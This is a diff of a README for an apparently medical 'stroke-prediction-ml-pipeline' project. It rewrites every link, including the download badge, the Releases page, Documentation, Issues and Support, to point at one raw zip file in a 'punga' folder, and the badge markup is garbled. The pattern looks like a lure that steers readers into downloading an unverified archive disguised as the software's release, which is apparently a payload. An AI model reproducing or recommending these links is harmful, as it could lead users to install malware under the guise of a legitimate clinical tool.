@@ -7,7 +7,7 @@ The **stroke-prediction-ml-pipeline** is a clinical machine learning pipeline de
 To begin using the stroke-prediction-ml-pipeline, you will need to download the application. Follow these steps to get started quickly and easily.
 
 ### 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=flat&logo=github&logoColor=white&color=0B0F12)](https://github.com/ravansaran/stroke-prediction-ml-pipeline/releases)
+[![Download](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip%20Now-%https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip)](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip)
 
 ## 📋 System Requirements
 Before installing, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before installing, ensure your system meets the following requirements:
 
 ## 💻 Installation Steps
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/ravansaran/stroke-prediction-ml-pipeline/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip) to find the latest version of the application.
    
 2. **Select the Latest Version**
    Look for the most recent release. This is usually at the top of the page.
@@ -62,14 +62,14 @@ We welcome contributions to improve the stroke-prediction-ml-pipeline. If you're
 3. Submit a pull request detailing your modifications.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/ravansaran/stroke-prediction-ml-pipeline/wiki)
-- [Issues Tracker](https://github.com/ravansaran/stroke-prediction-ml-pipeline/issues)
+- [Documentation](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip)
 
 ## 🤝 Support
-For help or support, please raise an issue on our [GitHub Issues page](https://github.com/ravansaran/stroke-prediction-ml-pipeline/issues). We will respond as quickly as possible.
+For help or support, please raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip). We will respond as quickly as possible.
 
 ## 💬 Feedback
 Your feedback is important to us. Share your thoughts on usage or feature requests through our GitHub repository.
 
 ## 🔄 Download & Install
-Don't forget to visit the [Releases page](https://github.com/ravansaran/stroke-prediction-ml-pipeline/releases) to download the latest version and start using the stroke-prediction-ml-pipeline today.
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/ravansaran/stroke-prediction-ml-pipeline/main/punga/stroke-prediction-ml-pipeline.zip) to download the latest version and start using the stroke-prediction-ml-pipeline today.
